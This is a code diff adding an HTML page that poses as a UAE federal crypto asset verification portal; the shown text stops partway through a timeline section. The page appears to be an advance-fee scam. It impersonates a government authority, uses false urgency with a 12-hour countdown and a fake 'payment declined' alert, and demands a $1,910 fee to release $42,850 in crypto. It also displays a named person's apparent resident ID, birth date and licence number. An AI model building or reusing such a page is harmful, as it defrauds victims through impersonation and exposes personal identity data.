@@ -1,0 +1,1600 @@
+<!doctype html>
+<html lang="en">
+  <head>
+    <meta charset="UTF-8" />
+    <meta name="viewport" content="width=device-width, initial-scale=0.8" />
+    <title>UAE Crypto Asset Verification Portal - Action Required</title>
+    <link
+      rel="stylesheet"
+      href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css"
+    />
+    <link
+      href="https://fonts.googleapis.com/css2?family=Inter:wght@300;400;500;600;700;800&display=swap"
+      rel="stylesheet"
+    />
+    <style>
+      :root {
+        --primary: #0c4b78;
+        --primary-dark: #052743;
+        --secondary: #00b4d8;
+        --accent: #00e676;
+        --warning: #ff9800;
+        --danger: #ff5252;
+        --danger-dark: #d32f2f;
+        --light: #f8f9fa;
+        --dark: #212529;
+        --gray: #6c757d;
+        --gray-light: #e9ecef;
+        --border-radius: 12px;
+        --box-shadow: 0 8px 30px rgba(0, 0, 0, 0.12);
+        --box-shadow-heavy: 0 15px 50px rgba(0, 0, 0, 0.2);
+        --transition: all 0.3s ease;
+      }
+
+      * {
+        margin: 0;
+        padding: 0;
+        box-sizing: border-box;
+      }
+
+      body {
+        font-family: "Inter", sans-serif;
+        background: linear-gradient(135deg, #f0f4f8 0%, #d9e2ec 100%);
+        color: var(--dark);
+        line-height: 1.6;
+        min-height: 100vh;
+        padding: 20px;
+        position: relative;
+        overflow-x: hidden;
+      }
+
+      body::before {
+        content: "";
+        position: fixed;
+        top: 0;
+        left: 0;
+        width: 100%;
+        height: 100%;
+        background: url("data:image/svg+xml;base64,PHN2ZyB3aWR0aD0iMjAwIiBoZWlnaHQ9IjIwMCIgeG1sbnM9Imh0dHA6Ly93d3cudzMub3JnLzIwMDAvc3ZnIj48ZGVmcz48cGF0dGVybiBpZD0iZ3JpZCIgd2lkdGg9IjQwIiBoZWlnaHQ9IjQwIiBwYXR0ZXJuVW5pdHM9InVzZXJTcGFjZU9uVXNlIj48cGF0aCBkPSJNIDQwIDAgTCAwIDAgMCA0MCIgZmlsbD0ibm9uZSIgc3Ryb2tlPSJyZ2JhKDEyLCA3NSwgMTIwLCAwLjAzKSIgc3Ryb2tlLXdpZHRoPSIxIi8+PC9wYXR0ZXJuPjwvZGVmcz48cmVjdCB3aWR0aD0iMTAwJSIgaGVpZ2h0PSIxMDAlIiBmaWxsPSJ1cmwoI2dyaWQpIi8+PC9zdmc+");
+        opacity: 0.3;
+        z-index: -1;
+      }
+
+      .container {
+        max-width: 1400px;
+        margin: 0 auto;
+      }
+
+      /* Header Styles */
+      .header {
+        background: linear-gradient(
+          135deg,
+          var(--primary) 0%,
+          var(--primary-dark) 100%
+        );
+        color: white;
+        border-radius: var(--border-radius);
+        padding: 25px 35px;
+        margin-bottom: 30px;
+        box-shadow: var(--box-shadow-heavy);
+        display: flex;
+        justify-content: space-between;
+        align-items: center;
+        position: relative;
+        overflow: hidden;
+      }
+
+      .header::before {
+        content: "";
+        position: absolute;
+        top: 0;
+        right: 0;
+        width: 200px;
+        height: 200px;
+        background: rgba(255, 255, 255, 0.05);
+        border-radius: 50%;
+        transform: translate(30%, -30%);
+      }
+
+      .logo-section {
+        display: flex;
+        align-items: center;
+        gap: 20px;
+        position: relative;
+        z-index: 2;
+      }
+
+      .logo {
+        font-size: 36px;
+        background: white;
+        color: var(--primary);
+        width: 70px;
+        height: 70px;
+        border-radius: 50%;
+        display: flex;
+        align-items: center;
+        justify-content: center;
+        box-shadow: 0 5px 15px rgba(0, 0, 0, 0.1);
+      }
+
+      .header-title h1 {
+        font-size: 28px;
+        font-weight: 800;
+        margin-bottom: 5px;
+        letter-spacing: -0.5px;
+      }
+
+      .header-title p {
+        opacity: 0.9;
+        font-size: 14px;
+        font-weight: 300;
+      }
+
+      .security-badge {
+        background: rgba(255, 255, 255, 0.15);
+        padding: 12px 25px;
+        border-radius: 50px;
+        font-size: 14px;
+        display: flex;
+        align-items: center;
+        gap: 10px;
+        backdrop-filter: blur(5px);
+        border: 1px solid rgba(255, 255, 255, 0.2);
+        position: relative;
+        z-index: 2;
+      }
+
+      .urgent-alert {
+        background: linear-gradient(
+          135deg,
+          var(--danger) 0%,
+          var(--danger-dark) 100%
+        );
+        color: white;
+        border-radius: var(--border-radius);
+        padding: 18px 25px;
+        margin-bottom: 30px;
+        box-shadow: 0 5px 20px rgba(255, 82, 82, 0.3);
+        display: flex;
+        align-items: center;
+        gap: 15px;
+        animation: pulse-alert 2s infinite;
+      }
+
+      @keyframes pulse-alert {
+        0% {
+          box-shadow: 0 5px 20px rgba(255, 82, 82, 0.3);
+        }
+        50% {
+          box-shadow: 0 5px 25px rgba(255, 82, 82, 0.5);
+        }
+        100% {
+          box-shadow: 0 5px 20px rgba(255, 82, 82, 0.3);
+        }
+      }
+
+      /* Main Content */
+      .content {
+        display: grid;
+        grid-template-columns: 2fr 1fr;
+        gap: 35px;
+      }
+
+      @media (max-width: 1200px) {
+        .content {
+          grid-template-columns: 1fr;
+        }
+      }
+
+      /* Verification Panel */
+      .verification-panel {
+        background: white;
+        border-radius: var(--border-radius);
+        box-shadow: var(--box-shadow-heavy);
+        overflow: hidden;
+      }
+
+      .panel-header {
+        background: linear-gradient(
+          135deg,
+          var(--primary) 0%,
+          var(--primary-dark) 100%
+        );
+        color: white;
+        padding: 25px 35px;
+        position: relative;
+        overflow: hidden;
+      }
+
+      .panel-header::after {
+        content: "";
+        position: absolute;
+        bottom: 0;
+        left: 0;
+        width: 100%;
+        height: 4px;
+        background: linear-gradient(to right, var(--accent), var(--secondary));
+      }
+
+      .panel-header h2 {
+        font-size: 26px;
+        font-weight: 700;
+        display: flex;
+        align-items: center;
+        gap: 15px;
+        position: relative;
+        z-index: 2;
+      }
+
+      .panel-body {
+        padding: 35px;
+      }
+
+      .user-info {
+        background: linear-gradient(135deg, #f8f9fa 0%, #e9ecef 100%);
+        border-radius: var(--border-radius);
+        padding: 25px;
+        margin-bottom: 35px;
+        display: flex;
+        align-items: center;
+        gap: 25px;
+        border-left: 5px solid var(--secondary);
+        box-shadow: 0 5px 15px rgba(0, 0, 0, 0.05);
+      }
+
+      .user-avatar {
+        width: 80px;
+        height: 80px;
+        background: linear-gradient(135deg, var(--primary), var(--secondary));
+        border-radius: 50%;
+        display: flex;
+        align-items: center;
+        justify-content: center;
+        font-size: 32px;
+        color: white;
+        font-weight: 700;
+        box-shadow: 0 5px 15px rgba(12, 75, 120, 0.3);
+      }
+
+      .user-details h3 {
+        font-size: 24px;
+        margin-bottom: 8px;
+        color: var(--primary-dark);
+      }
+
+      .user-details p {
+        color: var(--gray);
+        font-size: 14px;
+        margin-bottom: 5px;
+        display: flex;
+        align-items: center;
+        gap: 8px;
+      }
+
+      /* Documents Section */
+      .documents-section {
+        margin-bottom: 40px;
+      }
+
+      .section-header {
+        display: flex;
+        justify-content: space-between;
+        align-items: center;
+        margin-bottom: 20px;
+        padding-bottom: 15px;
+        border-bottom: 2px solid var(--gray-light);
+      }
+
+      .section-header h3 {
+        font-size: 22px;
+        color: var(--primary-dark);
+        display: flex;
+        align-items: center;
+        gap: 10px;
+      }
+
+      .documents-grid {
+        display: grid;
+        grid-template-columns: repeat(auto-fill, minmax(250px, 1fr));
+        gap: 20px;
+      }
+
+      .document-card {
+        background: white;
+        border-radius: var(--border-radius);
+        overflow: hidden;
+        box-shadow: 0 5px 15px rgba(0, 0, 0, 0.08);
+        transition: var(--transition);
+        border: 1px solid var(--gray-light);
+        cursor: pointer;
+      }
+
+      .document-card:hover {
+        transform: translateY(-5px);
+        box-shadow: 0 15px 30px rgba(0, 0, 0, 0.15);
+      }
+
+      .document-card.active {
+        border-color: var(--secondary);
+        box-shadow: 0 5px 20px rgba(0, 180, 216, 0.3);
+      }
+
+      .document-preview {
+        height: 180px;
+        background: linear-gradient(135deg, #f5f7fa 0%, #e4e8f0 100%);
+        display: flex;
+        align-items: center;
+        justify-content: center;
+        position: relative;
+        overflow: hidden;
+      }
+
+      .document-preview::after {
+        content: "";
+        position: absolute;
+        top: 0;
+        left: 0;
+        width: 100%;
+        height: 100%;
+        background: linear-gradient(
+          135deg,
+          rgba(12, 75, 120, 0.1) 0%,
+          rgba(0, 180, 216, 0.1) 100%
+        );
+      }
+
+      .document-icon {
+        font-size: 48px;
+        color: var(--primary);
+        z-index: 1;
+      }
+
+      .document-info {
+        padding: 20px;
+        border-top: 1px solid var(--gray-light);
+      }
+
+      .document-info h4 {
+        font-size: 16px;
+        margin-bottom: 8px;
+        color: var(--dark);
+      }
+
+      .document-info p {
+        font-size: 13px;
+        color: var(--gray);
+        margin-bottom: 5px;
+      }
+
+      .document-status {
+        display: flex;
+        align-items: center;
+        gap: 8px;
+        font-size: 13px;
+        font-weight: 600;
+      }
+
+      .document-status.verified {
+        color: var(--accent);
+      }
+
+      /* Document Viewer Modal */
+      .document-viewer-overlay {
+        position: fixed;
+        top: 0;
+        left: 0;
+        width: 100%;
+        height: 100%;
+        background: rgba(0, 0, 0, 0.85);
+        display: none;
+        align-items: center;
+        justify-content: center;
+        z-index: 1000;
+        padding: 20px;
+        backdrop-filter: blur(5px);
+      }
+
+      .document-viewer {
+        background: white;
+        border-radius: var(--border-radius);
+        width: 100%;
+        max-width: 900px;
+        max-height: 90vh;
+        overflow: hidden;
+        box-shadow: 0 20px 60px rgba(0, 0, 0, 0.3);
+        animation: modal-appear 0.3s ease;
+      }
+
+      @keyframes modal-appear {
+        0% {
+          opacity: 0;
+          transform: scale(0.9);
+        }
+        100% {
+          opacity: 1;
+          transform: scale(1);
+        }
+      }
+
+      .viewer-header {
+        background: var(--primary);
+        color: white;
+        padding: 20px 25px;
+        display: flex;
+        justify-content: space-between;
+        align-items: center;
+      }
+
+      .viewer-header h3 {
+        font-size: 20px;
+        display: flex;
+        align-items: center;
+        gap: 10px;
+      }
+
+      .close-viewer {
+        background: rgba(255, 255, 255, 0.2);
+        border: none;
+        color: white;
+        width: 40px;
+        height: 40px;
+        border-radius: 50%;
+        display: flex;
+        align-items: center;
+        justify-content: center;
+        cursor: pointer;
+        transition: var(--transition);
+      }
+
+      .close-viewer:hover {
+        background: rgba(255, 255, 255, 0.3);
+      }
+
+      .viewer-body {
+        padding: 0;
+        max-height: calc(90vh - 80px);
+        overflow-y: auto;
+      }
+
+      .document-image {
+        width: 100%;
+        display: block;
+      }
+
+      /* Payment Section with Decline */
+      .payment-section {
+        background: white;
+        border-radius: var(--border-radius);
+        box-shadow: var(--box-shadow);
+        overflow: hidden;
+        margin-bottom: 40px;
+        border: 1px solid var(--gray-light);
+      }
+
+      .payment-header {
+        background: linear-gradient(
+          135deg,
+          var(--primary) 0%,
+          var(--primary-dark) 100%
+        );
+        color: white;
+        padding: 25px 35px;
+        display: flex;
+        justify-content: space-between;
+        align-items: center;
+      }
+
+      .payment-header h3 {
+        font-size: 24px;
+        display: flex;
+        align-items: center;
+        gap: 15px;
+      }
+
+      .payment-status {
+        display: flex;
+        align-items: center;
+        gap: 10px;
+        font-size: 16px;
+        font-weight: 600;
+        padding: 10px 20px;
+        border-radius: 50px;
+        background: rgba(255, 255, 255, 0.15);
+      }
+
+      .payment-status.declined {
+        background: rgba(255, 82, 82, 0.2);
+        color: #ffebee;
+      }
+
+      .payment-body {
+        padding: 35px;
+      }
+
+      .payment-amount-section {
+        text-align: center;
+        margin-bottom: 30px;
+        padding-bottom: 30px;
+        border-bottom: 1px solid var(--gray-light);
+      }
+
+      .payment-label {
+        font-size: 18px;
+        color: var(--gray);
+        margin-bottom: 15px;
+      }
+
+      .payment-amount {
+        font-size: 48px;
+        font-weight: 800;
+        color: var(--primary);
+        margin-bottom: 10px;
+      }
+
+      .payment-subtext {
+        color: var(--gray);
+        font-size: 14px;
+      }
+
+      .payment-details-grid {
+        display: grid;
+        grid-template-columns: repeat(auto-fit, minmax(250px, 1fr));
+        gap: 25px;
+        margin-bottom: 35px;
+      }
+
+      .payment-detail {
+        background: var(--light);
+        border-radius: var(--border-radius);
+        padding: 20px;
+        border-left: 4px solid var(--secondary);
+      }
+
+      .payment-detail h4 {
+        font-size: 16px;
+        margin-bottom: 10px;
+        color: var(--primary-dark);
+        display: flex;
+        align-items: center;
+        gap: 10px;
+      }
+
+      .payment-detail p {
+        font-size: 14px;
+        color: var(--gray);
+        line-height: 1.5;
+      }
+
+      .declined-alert {
+        background: rgba(255, 82, 82, 0.1);
+        border: 1px solid rgba(255, 82, 82, 0.3);
+        border-radius: var(--border-radius);
+        padding: 20px;
+        margin-bottom: 30px;
+        display: flex;
+        align-items: flex-start;
+        gap: 15px;
+      }
+
+      .declined-alert i {
+        color: var(--danger);
+        font-size: 24px;
+        margin-top: 2px;
+      }
+
+      .declined-alert h4 {
+        color: var(--danger-dark);
+        margin-bottom: 8px;
+        font-size: 18px;
+      }
+
+      .declined-alert p {
+        color: var(--gray);
+        font-size: 14px;
+        margin-bottom: 10px;
+      }
+
+      .declined-reasons {
+        margin-top: 15px;
+        padding-left: 20px;
+      }
+
+      .declined-reasons li {
+        margin-bottom: 8px;
+        color: var(--gray);
+        font-size: 14px;
+      }
+
+      .payment-button-container {
+        text-align: center;
+        margin-top: 30px;
+      }
+
+      .payment-button {
+        background: linear-gradient(
+          135deg,
+          var(--primary) 0%,
+          var(--primary-dark) 100%
+        );
+        color: white;
+        border: none;
+        border-radius: 10px;
+        padding: 20px 50px;
+        font-size: 20px;
+        font-weight: 700;
+        cursor: pointer;
+        transition: var(--transition);
+        display: inline-flex;
+        align-items: center;
+        gap: 15px;
+        box-shadow: 0 10px 30px rgba(12, 75, 120, 0.3);
+        position: relative;
+        overflow: hidden;
+      }
+
+      .payment-button:hover {
+        transform: translateY(-5px);
+        box-shadow: 0 15px 40px rgba(12, 75, 120, 0.4);
+      }
+
+      .payment-button::after {
+        content: "";
+        position: absolute;
+        top: -50%;
+        left: -50%;
+        width: 200%;
+        height: 200%;
+        background: linear-gradient(
+          to right,
+          transparent,
+          rgba(255, 255, 255, 0.2),
+          transparent
+        );
+        transform: rotate(30deg);
+        transition: all 0.5s ease;
+      }
+
+      .payment-button:hover::after {
+        left: 100%;
+      }
+
+      .payment-button.declined {
+        background: linear-gradient(
+          135deg,
+          var(--danger) 0%,
+          var(--danger-dark) 100%
+        );
+        animation: pulse-button 1.5s infinite;
+      }
+
+      @keyframes pulse-button {
+        0% {
+          box-shadow: 0 10px 30px rgba(255, 82, 82, 0.3);
+        }
+        50% {
+          box-shadow: 0 10px 40px rgba(255, 82, 82, 0.5);
+        }
+        100% {
+          box-shadow: 0 10px 30px rgba(255, 82, 82, 0.3);
+        }
+      }
+
+      /* Side Panel */
+      .side-panel {
+        display: flex;
+        flex-direction: column;
+        gap: 35px;
+      }
+
+      .status-card,
+      .transfer-card,
+      .timeline-card {
+        background: white;
+        border-radius: var(--border-radius);
+        box-shadow: var(--box-shadow);
+        padding: 30px;
+      }
+
+      .status-card h3,
+      .transfer-card h3,
+      .timeline-card h3 {
+        font-size: 22px;
+        margin-bottom: 25px;
+        color: var(--primary-dark);
+        display: flex;
+        align-items: center;
+        gap: 12px;
+        padding-bottom: 15px;
+        border-bottom: 2px solid var(--gray-light);
+      }
+
+      .status-item {
+        display: flex;
+        justify-content: space-between;
+        margin-bottom: 18px;
+        padding-bottom: 18px;
+        border-bottom: 1px solid #f1f1f1;
+      }
+
+      .status-item:last-child {
+        margin-bottom: 0;
+        padding-bottom: 0;
+        border-bottom: none;
+      }
+
+      .status-label {
+        color: var(--gray);
+        font-size: 15px;
+      }
+
+      .status-value {
+        font-weight: 600;
+        color: var(--dark);
+        display: flex;
+        align-items: center;
+        gap: 8px;
+      }
+
+      .status-value.completed {
+        color: var(--accent);
+      }
+
+      .status-value.pending {
+        color: var(--warning);
+      }
+
+      .status-value.declined {
+        color: var(--danger);
+      }
+
+      .transfer-details {
+        background: linear-gradient(135deg, #f8f9fa 0%, #e9ecef 100%);
+        border-radius: var(--border-radius);
+        padding: 20px;
+        margin-bottom: 25px;
+      }
+
+      .transfer-amount {
+        font-size: 32px;
+        font-weight: 800;
+        color: var(--primary);
+        margin-bottom: 10px;
+        display: flex;
+        align-items: center;
+        gap: 10px;
+      }
+
+      .wallet-address {
+        background: white;
+        border-radius: 8px;
+        padding: 15px;
+        font-family: "Courier New", monospace;
+        font-size: 14px;
+        word-break: break-all;
+        margin-bottom: 20px;
+        border: 1px solid var(--gray-light);
+        color: var(--dark);
+      }
+
+      .timeline {
+        position: relative;
+        padding-left: 30px;
+      }
+
+      .timeline::before {
+        content: "";
+        position: absolute;
+        left: 10px;
+        top: 0;
+        height: 100%;
+        width: 2px;
+        background: var(--gray-light);
+      }
+
+      .timeline-item {
+        position: relative;
+        margin-bottom: 25px;
+      }
+
+      .timeline-item:last-child {
+        margin-bottom: 0;
+      }
+
+      .timeline-marker {
+        position: absolute;
+        left: -30px;
+        top: 0;
+        width: 22px;
+        height: 22px;
+        border-radius: 50%;
+        background: var(--light);
+        border: 3px solid var(--gray-light);
+        z-index: 1;
+      }
+
+      .timeline-item.completed .timeline-marker {
+        background: var(--accent);
+        border-color: var(--accent);
+      }
+
+      .timeline-item.active .timeline-marker {
+        background: var(--danger);
+        border-color: var(--danger);
+        animation: pulse-marker 1.5s infinite;
+      }
+
+      @keyframes pulse-marker {
+        0% {
+          box-shadow: 0 0 0 0 rgba(255, 82, 82, 0.7);
+        }
+        70% {
+          box-shadow: 0 0 0 10px rgba(255, 82, 82, 0);
+        }
+        100% {
+          box-shadow: 0 0 0 0 rgba(255, 82, 82, 0);
+        }
+      }
+
+      .timeline-content h4 {
+        font-size: 16px;
+        margin-bottom: 5px;
+        color: var(--dark);
+      }
+
+      .timeline-content p {
+        font-size: 13px;
+        color: var(--gray);
+      }
+
+      .timeline-date {
+        font-size: 12px;
+        color: var(--gray);
+        margin-top: 5px;
+      }
+
+      /* Footer */
+      .footer {
+        text-align: center;
+        margin-top: 50px;
+        padding: 25px;
+        color: var(--gray);
+        font-size: 14px;
+        border-top: 1px solid var(--gray-light);
+        background: rgba(255, 255, 255, 0.7);
+        border-radius: var(--border-radius);
+        backdrop-filter: blur(5px);
+      }
+
+      .disclaimer {
+        background: rgba(255, 82, 82, 0.05);
+        border: 1px solid rgba(255, 82, 82, 0.2);
+        border-radius: var(--border-radius);
+        padding: 20px;
+        margin-top: 25px;
+        font-size: 13px;
+        color: var(--gray);
+        text-align: left;
+      }
+
+      .disclaimer strong {
+        color: var(--danger-dark);
+      }
+
+      /* Countdown Timer */
+      .countdown-timer {
+        background: linear-gradient(
+          135deg,
+          var(--danger) 0%,
+          var(--danger-dark) 100%
+        );
+        color: white;
+        border-radius: var(--border-radius);
+        padding: 20px;
+        margin-bottom: 30px;
+        text-align: center;
+        box-shadow: 0 10px 30px rgba(255, 82, 82, 0.2);
+      }
+
+      .countdown-timer h4 {
+        font-size: 18px;
+        margin-bottom: 15px;
+        display: flex;
+        align-items: center;
+        justify-content: center;
+        gap: 10px;
+      }
+
+      .timer-display {
+        font-size: 32px;
+        font-weight: 800;
+        font-family: "Courier New", monospace;
+        margin-bottom: 10px;
+        letter-spacing: 2px;
+      }
+
+      .timer-label {
+        font-size: 14px;
+        opacity: 0.9;
+      }
+
+      /* Responsive */
+      @media (max-width: 992px) {
+        .header {
+          flex-direction: column;
+          align-items: flex-start;
+          gap: 20px;
+        }
+
+        .documents-grid {
+          grid-template-columns: repeat(auto-fill, minmax(200px, 1fr));
+        }
+
+        .payment-details-grid {
+          grid-template-columns: 1fr;
+        }
+
+        .payment-amount {
+          font-size: 40px;
+        }
+      }
+
+      @media (max-width: 768px) {
+        .user-info {
+          flex-direction: column;
+          text-align: center;
+        }
+
+        .payment-button {
+          width: 100%;
+          justify-content: center;
+        }
+
+        .panel-body,
+        .payment-body {
+          padding: 25px;
+        }
+      }
+    </style>
+  </head>
+  <body>
+    <div class="container">
+      <!-- Header -->
+      <header class="header">
+        <div class="logo-section">
+          <div class="logo">
+            <i class="fas fa-shield-alt"></i>
+          </div>
+          <div class="header-title">
+            <h1>UAE Blockchain Asset Verification Portal</h1>
+            <p>
+              Federal Authority for Identity, Citizenship, Customs & Port
+              Security
+            </p>
+          </div>
+        </div>
+        <div class="security-badge">
+          <i class="fas fa-lock"></i>
+          <span>SECURE CONNECTION • 256-BIT ENCRYPTION</span>
+        </div>
+      </header>
+
+      <!-- Urgent Alert -->
+      <div class="urgent-alert">
+        <i class="fas fa-exclamation-triangle fa-2x"></i>
+        <div>
+          <h3>URGENT ACTION REQUIRED: PAYMENT DECLINED</h3>
+          <p>
+            Your verification payment of $1,910 was declined by your financial
+            institution. You have <strong>12 hours</strong> to complete payment
+            before your assets are placed on administrative hold.
+          </p>
+        </div>
+      </div>
+
+      <!-- Countdown Timer -->
+      <div class="countdown-timer">
+        <h4>
+          <i class="fas fa-clock"></i> TIME REMAINING TO COMPLETE VERIFICATION
+        </h4>
+        <div class="timer-display" id="countdown">12:00:00</div>
+        <div class="timer-label">Hours : Minutes : Seconds</div>
+      </div>
+
+      <!-- Main Content -->
+      <div class="content">
+        <!-- Verification Panel -->
+        <main class="verification-panel">
+          <div class="panel-header">
+            <h2>
+              <i class="fas fa-user-check"></i> Identity & Asset Verification -
+              ACTION REQUIRED
+            </h2>
+          </div>
+
+          <div class="panel-body">
+            <!-- User Info -->
+            <div class="user-info">
+              <div class="user-avatar">JC</div>
+              <div class="user-details">
+                <h3>Jowel Chowdhury Vhupal</h3>
+                <p>
+                  <i class="fas fa-passport"></i> UAE Resident ID:
+                  784-1980-8637468-7
+                </p>
+                <p>
+                  <i class="fas fa-flag"></i> Nationality: Bangladesh |
+                  <i class="fas fa-birthday-cake"></i> DOB: 23/08/1980
+                </p>
+                <p>
+                  <i class="fas fa-map-marker-alt"></i> Residence: Dubai, UAE |
+                  <i class="fas fa-phone"></i> Case Ref:
+                  UAE-CRYPTO-2024-784-8637
+                </p>
+              </div>
+            </div>
+
+            <!-- Documents Section -->
+            <div class="documents-section">
+              <div class="section-header">
+                <h3><i class="fas fa-file-contract"></i> Verified Documents</h3>
+                <span style="color: var(--accent); font-weight: 600"
+                  ><i class="fas fa-check-circle"></i> All Documents
+                  Verified</span
+                >
+              </div>
+
+              <div class="documents-grid">
+                <!-- Document 1 -->
+                <div class="document-card" data-doc="emirates-id">
+                  <div class="document-preview">
+                    <i class="fas fa-id-card document-icon"></i>
+                  </div>
+                  <div class="document-info">
+                    <h4>UAE Resident Identity Card</h4>
+                    <p>Federal Authority for Identity & Citizenship</p>
+                    <p><strong>ID:</strong> 784-1980-8637468-7</p>
+                    <div class="document-status verified">
+                      <i class="fas fa-check-circle"></i> Verified
+                    </div>
+                  </div>
+                </div>
+
+                <!-- Document 2 -->
+                <div class="document-card" data-doc="driving-license">
+                  <div class="document-preview">
+                    <i class="fas fa-car document-icon"></i>
+                  </div>
+                  <div class="document-info">
+                    <h4>UAE Driving License</h4>
+                    <p>Dubai Roads & Transport Authority</p>
+                    <p><strong>License No:</strong> 1057537</p>
+                    <div class="document-status verified">
+                      <i class="fas fa-check-circle"></i> Verified
+                    </div>
+                  </div>
+                </div>
+
+                <!-- Document 3 -->
+                <div class="document-card" data-doc="employment-card">
+                  <div class="document-preview">
+                    <i class="fas fa-briefcase document-icon"></i>
+                  </div>
+                  <div class="document-info">
+                    <h4>Employment ID Card</h4>
+                    <p>Oasis Pure Water Factory (L.L.C.)</p>
+                    <p><strong>Position:</strong> Sales Officer</p>
+                    <div class="document-status verified">
+                      <i class="fas fa-check-circle"></i> Verified
+                    </div>
+                  </div>
+                </div>
+
+                <!-- Document 4 -->
+                <div class="document-card" data-doc="traffic-code">
+                  <div class="document-preview">
+                    <i class="fas fa-file-alt document-icon"></i>
+                  </div>
+                  <div class="document-info">
+                    <h4>Traffic Code Registration</h4>
+                    <p>UAE Ministry of Interior</p>
+                    <p><strong>Code No:</strong> 11254289</p>
+                    <div class="document-status verified">
+                      <i class="fas fa-check-circle"></i> Verified
+                    </div>
+                  </div>
+                </div>
+              </div>
+            </div>
+
+            <!-- Payment Section with Decline -->
+            <div class="payment-section">
+              <div class="payment-header">
+                <h3>
+                  <i class="fas fa-credit-card"></i> Final Verification Payment
+                </h3>
+                <div class="payment-status declined">
+                  <i class="fas fa-times-circle"></i> PAYMENT DECLINED
+                </div>
+              </div>
+
+              <div class="payment-body">
+                <div class="payment-amount-section">
+                  <div class="payment-label">REQUIRED VERIFICATION FEE</div>
+                  <div class="payment-amount">$1,910.00</div>
+                  <div class="payment-subtext">
+                    One-time regulatory compliance fee | Non-refundable after
+                    transfer initiation
+                  </div>
+                </div>
+
+                <div class="payment-details-grid">
+                  <div class="payment-detail">
+                    <h4>
+                      <i class="fas fa-shield-alt"></i> Asset Security Release
+                    </h4>
+                    <p>
+                      Fee required to release your blockchain assets from UAE
+                      regulatory hold and initiate transfer to your Binance
+                      wallet.
+                    </p>
+                  </div>
+
+                  <div class="payment-detail">
+                    <h4><i class="fas fa-bolt"></i> Immediate Transfer</h4>
+                    <p>
+                      Upon payment confirmation, your assets (valued at $42,850)
+                      will be transferred within 2-5 minutes to your verified
+                      Binance account.
+                    </p>
+                  </div>
+
+                  <div class="payment-detail">
+                    <h4>
+                      <i class="fas fa-file-certificate"></i> Compliance
+                      Certificate
+                    </h4>
+                    <p>
+                      You will receive an official UAE Federal Authority
+                      certificate verifying your assets for international crypto
+                      transactions.
+                    </p>
+                  </div>
+                </div>
+
+                <div class="declined-alert">
+                  <i class="fas fa-exclamation-circle"></i>
+                  <div>
+                    <h4>PAYMENT DECLINED BY YOUR FINANCIAL INSTITUTION</h4>
+                    <p>
+                      Our secure payment gateway attempted to process your
+                      payment of $1,910 but it was declined by your bank/card
+                      issuer. Common reasons for decline include:
+                    </p>
+                    <ul class="declined-reasons">
+                      <li>International transaction limit exceeded</li>
+                      <li>Suspected fraud protection triggered</li>
+                      <li>Insufficient funds or daily limit reached</li>
+                      <li>Card not enabled for international payments</li>
+                    </ul>
+                    <p>
+                      <strong>Action Required:</strong> Please try again with
+                      the same or alternate payment method. Ensure your card
+                      allows international transactions.
+                    </p>
+                  </div>
+                </div>
+
+                <div class="payment-button-container">
+                  <button id="paymentButton" class="payment-button declined">
+                    <i class="fas fa-lock"></i>
+                    <span>RETRY SECURE PAYMENT - $1,910</span>
+                    <i class="fas fa-arrow-right"></i>
+                  </button>
+                  <p
+                    style="
+                      margin-top: 20px;
+                      color: var(--gray);
+                      font-size: 14px;
+                    "
+                  >
+                    <i class="fas fa-lock"></i> 256-bit encrypted payment
+                    gateway secured by UAE Federal Authority
+                  </p>
+                </div>
+              </div>
+            </div>
+          </div>
+        </main>
+
+        <!-- Side Panel -->
+        <aside class="side-panel">
+          <!-- Status Card -->
+          <div class="status-card">
+            <h3><i class="fas fa-tasks"></i> Verification Status</h3>
+
+            <div class="status-item">
+              <span class="status-label">Identity Verification</span>
+              <span class="status-value completed"
+                ><i class="fas fa-check-circle"></i> Verified</span
+              >
+            </div>
+
+            <div class="status-item">
+              <span class="status-label">Document Verification</span>
+              <span class="status-value completed"
+                ><i class="fas fa-check-circle"></i> Verified</span
+              >
+            </div>
+
+            <div class="status-item">
+              <span class="status-label">Residency Status</span>
+              <span class="status-value completed"
+                ><i class="fas fa-check-circle"></i> Confirmed</span
+              >
+            </div>
+
+            <div class="status-item">
+              <span class="status-label">Compliance Fee</span>
+              <span class="status-value declined"
+                ><i class="fas fa-times-circle"></i> Declined</span
+              >
+            </div>
+
+            <div class="status-item">
+              <span class="status-label">Asset Transfer</span>
+              <span class="status-value pending"
+                ><i class="fas fa-clock"></i> On Hold</span
+              >
+            </div>
+
+            <div class="status-item">
+              <span class="status-label">Case Priority</span>
+              <span class="status-value" style="color: var(--danger)"
+                ><i class="fas fa-exclamation-triangle"></i> HIGH</span
+              >
+            </div>
+          </div>
+
+          <!-- Transfer Card -->
+          <div class="transfer-card">
+            <h3><i class="fas fa-wallet"></i> Binance Transfer Details</h3>
+
+            <div class="transfer-details">
+              <div class="transfer-amount">
+                <i class="fas fa-coins"></i> $42,850
+              </div>
+              <div style="color: var(--gray); font-size: 14px">
+                Pending transfer to your verified Binance wallet
+              </div>
+            </div>
+
+            <div style="margin-bottom: 15px">
+              <div
+                style="font-size: 15px; color: var(--gray); margin-bottom: 8px"
+              >
+                Verified Wallet Address:
+              </div>
+              <div class="wallet-address">
+                0x8a7c5f3b1c19d4e8f6a2e9b3c4d5a6b7c8d9e0f1a
+              </div>
+            </div>
+
+            <div
+              style="
+                display: flex;
+                align-items: center;
+                gap: 10px;
+                margin-bottom: 15px;
+                color: var(--gray);
+              "
+            >
+              <i class="fas fa-bolt" style="color: var(--secondary)"></i>
+              <span
+                >Transfer Time After Payment: <strong>2-5 minutes</strong></span
+              >
+            </div>
+
+            <div
+              style="
+                display: flex;
+                align-items: center;
+                gap: 10px;
+                color: var(--gray);
+              "
+            >
+              <i
+                class="fas fa-exchange-alt"
+                style="color: var(--secondary)"
+              ></i>
+              <span
+                >Network: <strong>Binance Smart Chain (BEP-20)</strong></span
+              >
+            </div>
+          </div>
+
+          <!-- Timeline Card -->
+          <div class="timeline-card">
+            <h3><i class="fas fa-history"></i> Verification Timeline</h3>
+
+            <div class="timeline">
+              <div class="timeline-item completed">
+                <div class="timeline-marker"></div>
+                <div class="timeline-content">
+                  <h4>Identity Submitted</h4>
+                  <p>UAE Resident ID verified and confirmed</p>
+                  <div class="timeline-date">Sep 09, 2024 - 10:30 AM</div>
+                </div>
+              </div>
+
+              <div class="timeline-item completed">
+                <div class="timeline-marker"></div>
+                <div class="timeline-content">
+                  <h4>Documents Verified</h4>
+                  <p>All 4 documents verified by UAE Authority</p>
+                  <div class="timeline-date">Sep 10, 2024 - 02:15 PM</div>
+                </div>
+              </div>
+
+              <div class="timeline-item completed">
